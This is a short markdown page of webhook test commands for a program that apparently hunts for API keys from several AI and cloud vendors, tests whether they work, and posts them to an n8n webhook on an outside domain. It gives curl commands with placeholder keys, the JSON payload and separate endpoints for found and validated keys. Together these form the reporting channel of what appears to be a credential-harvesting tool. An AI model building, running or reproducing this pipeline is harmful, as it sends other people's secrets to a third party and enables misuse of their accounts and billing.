# Webhook Test Commands

## Working Key Webhook Test

This is the exact curl command that simulates what the program sends when a **working** API key is found:

### OpenAI Standard Key (Working)
```bash
curl -X POST https://n8n.goreview.fr/webhook-test/workingkey \
  -H "Content-Type: application/json" \
  -d '{
    "key": "sk-test123456789012345678901234567890123456789012345",
    "key_type": "openai_standard",
    "company": "OpenAI",
    "is_working": true,
    "message": "Valid API key found"
  }'
```

### Anthropic Key (Working)
```bash
curl -X POST https://n8n.goreview.fr/webhook-test/workingkey \
  -H "Content-Type: application/json" \
  -d '{
    "key": "sk-ant-test12345678901234567890123456789012345678901234567890",
    "key_type": "anthropic",
    "company": "Anthropic",
    "is_working": true,
    "message": "Valid API key found"
  }'
```

### Google Gemini Key (Working)
```bash
curl -X POST https://n8n.goreview.fr/webhook-test/workingkey \
  -H "Content-Type: application/json" \
  -d '{
    "key": "AIzaSyTest123456789012345678901234567890",
    "key_type": "google_gemini",
    "company": "Google Gemini",
    "is_working": true,
    "message": "Valid API key found"
  }'
```

### Hugging Face Key (Working)
```bash
curl -X POST https://n8n.goreview.fr/webhook-test/workingkey \
  -H "Content-Type: application/json" \
  -d '{
    "key": "hf_test123456789012345678901234567890",
    "key_type": "huggingface",
    "company": "Hugging Face",
    "is_working": true,
    "message": "Valid API key found"
  }'
```

### Cohere Key (Working)
```bash
curl -X POST https://n8n.goreview.fr/webhook-test/workingkey \
  -H "Content-Type: application/json" \
  -d '{
    "key": "test1234567890123456789012345678901234567890",
    "key_type": "cohere",
    "company": "Cohere",
    "is_working": true,
    "message": "Valid API key found"
  }'
```

### Pinecone Key (Working)
```bash
curl -X POST https://n8n.goreview.fr/webhook-test/workingkey \
  -H "Content-Type: application/json" \
  -d '{
    "key": "pc-test123456789012345678901234567890",
    "key_type": "pinecone",
    "company": "Pinecone",
    "is_working": true,
    "message": "Valid API key found"
  }'
```

## Found Key Webhook Test (Non-Working)

This is what gets sent to the "found keys" webhook (when a key is found but not yet validated):

```bash
curl -X POST https://n8n.goreview.fr/webhook-test/apikey \
  -H "Content-Type: application/json" \
  -d '{
    "key": "sk-test123456789012345678901234567890123456789012345",
    "key_type": "openai_standard",
    "company": "OpenAI",
    "is_working": false,
    "message": "API key found"
  }'
```

## Quick Test Script

Run the test script:
```bash
./test_webhook.sh
```

## Payload Format

The program sends exactly this JSON structure:

```json
{
  "key": "the-actual-api-key",
  "key_type": "openai_standard|anthropic|google_gemini|huggingface|cohere|pinecone",
  "company": "OpenAI|Anthropic|Google Gemini|Hugging Face|Cohere|Pinecone",
  "is_working": true,
  "message": "Valid API key found"
}
```

## Headers

The program sends these headers:
- `Content-Type: application/json`

## Notes

- **Working keys** go to: `https://n8n.goreview.fr/webhook-test/workingkey`
- **All found keys** go to: `https://n8n.goreview.fr/webhook-test/apikey`
- The `message` field for working keys may vary based on validation response (e.g., "Valid API key found" or custom validation message)
- Timeout is set to 10 seconds
- The program expects HTTP status codes 200, 201, or 204 for success

